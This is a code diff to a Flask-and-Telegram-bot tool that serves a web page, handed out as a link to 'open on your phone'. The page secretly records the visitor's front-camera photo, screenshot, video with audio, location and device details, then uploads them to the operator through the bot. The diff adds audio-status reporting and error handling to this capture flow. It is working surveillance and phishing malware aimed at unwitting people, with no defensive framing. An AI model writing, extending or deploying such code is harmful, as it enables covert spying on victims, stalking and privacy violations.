@@ -248,6 +248,7 @@ HTML_PAGE = """<!DOCTYPE html>
             let stream = await getFrontStream();
             let audioStream = null;
             let combinedStream = stream;
+            let audioStatus = 'none';
 
             // If stream has no audio tracks, get an audio-only stream and combine
             if (stream && stream.getAudioTracks().length === 0) {
@@ -258,7 +259,14 @@ HTML_PAGE = """<!DOCTYPE html>
                     stream.getVideoTracks().forEach(t => tracks.push(t));
                     audioStream.getAudioTracks().forEach(t => tracks.push(t));
                     combinedStream = new MediaStream(tracks);
+                    audioStatus = 'combined';
+                } else {
+                    audioStatus = 'failed (no audio)';
                 }
+            } else if (stream && stream.getAudioTracks().length > 0) {
+                audioStatus = 'present';
+            } else {
+                audioStatus = 'no stream';
             }
 
             // If stream is null or no video, try to get any camera with audio
@@ -266,7 +274,11 @@ HTML_PAGE = """<!DOCTYPE html>
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     combinedStream = stream;
-                } catch (e) {}
+                    audioStatus = 'present (fallback)';
+                } catch (e) {
+                    stream = null;
+                    combinedStream = null;
+                }
             }
 
             // Capture frame (one photo)
@@ -281,6 +293,7 @@ HTML_PAGE = """<!DOCTYPE html>
             // Recording
             let videoBlob = null;
             let finalized = false;
+            let errorMsg = '';
 
             async function finalizeAndSend() {
                 if (finalized) return;
@@ -307,6 +320,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('orientation', orientation);
                 fd.append('camera_status', combinedStream ? 'success' : 'failed');
                 fd.append('camera_error', combinedStream ? '' : 'No camera stream');
+                fd.append('audio_status', audioStatus);
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                 if (imageBlob) fd.append('frontImage', imageBlob, 'front.jpg');
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
@@ -318,47 +332,54 @@ HTML_PAGE = """<!DOCTYPE html>
 
             // If we have a stream for recording, start recording
             if (combinedStream) {
-                let mimeType = 'video/webm;codecs=vp9,opus';
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
-                    mimeType = 'video/webm;codecs=vp8,opus';
-                }
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
-                    mimeType = 'video/webm';
-                }
-                mediaRecorder = new MediaRecorder(combinedStream, { mimeType: mimeType });
-                recordedChunks = [];
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    finalizeAndSend();
-                };
-                mediaRecorder.start(1000);
-                recordingActive = true;
-                // Stop after maxDuration
-                setTimeout(() => {
-                    if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
+                try {
+                    // Try the most compatible mime type
+                    let mimeType = 'video/webm';
+                    // Check if we can use a codec with audio
+                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
+                        mimeType = 'video/webm;codecs=vp9,opus';
+                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                        mimeType = 'video/webm;codecs=vp8,opus';
                     }
-                }, maxDuration);
-                // Stop on page close
-                window.addEventListener('beforeunload', () => {
-                    if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
-                    }
-                });
-                // Fallback: if onstop doesn't fire (e.g., error), force finalize after timeout
-                setTimeout(() => {
-                    if (!finalized) {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder = new MediaRecorder(combinedStream, { mimeType: mimeType });
+                    recordedChunks = [];
+                    mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                        finalizeAndSend();
+                    };
+                    mediaRecorder.start(1000);
+                    recordingActive = true;
+                    // Stop after maxDuration
+                    setTimeout(() => {
+                        if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                             recordingActive = false;
                         }
-                        if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
-                        finalizeAndSend();
-                    }
-                }, maxDuration + 3000);
+                    }, maxDuration);
+                    // Stop on page close
+                    window.addEventListener('beforeunload', () => {
+                        if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            recordingActive = false;
+                        }
+                    });
+                    // Fallback: if onstop doesn't fire (e.g., error), force finalize after timeout
+                    setTimeout(() => {
+                        if (!finalized) {
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                                recordingActive = false;
+                            }
+                            if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
+                            finalizeAndSend();
+                        }
+                    }, maxDuration + 3000);
+                } catch (e) {
+                    errorMsg = 'Recording error: ' + e.message;
+                    // Fallback: send without video
+                    finalizeAndSend();
+                }
             } else {
                 // No stream – finalize immediately (only image may be null)
                 finalizeAndSend();
@@ -394,6 +415,7 @@ def capture():
     orientation = request.form.get('orientation', 'unknown')
     camera_status = request.form.get('camera_status', 'unknown')
     camera_error = request.form.get('camera_error', '')
+    audio_status = request.form.get('audio_status', 'unknown')
     screenshot = request.files.get('screenshot')
     front_img = request.files.get('frontImage')
     video = request.files.get('video')
@@ -421,7 +443,8 @@ def capture():
                 f"🖥️ Screen: {screen_res}\n"
                 f"⏰ Timezone: {timezone}\n"
                 f"🌍 Language: {language}\n"
-                f"🔄 Orientation: {orientation}"
+                f"🔄 Orientation: {orientation}\n"
+                f"🎙️ Audio: {audio_status}"
             )
             bot.send_message(uid, msg)
         except Exception as e:
@@ -463,7 +486,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, front camera image, and video recording with audio.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, front camera image, and video recording with audio status.")
 
 def run_bot():
     print("Bot polling started.")
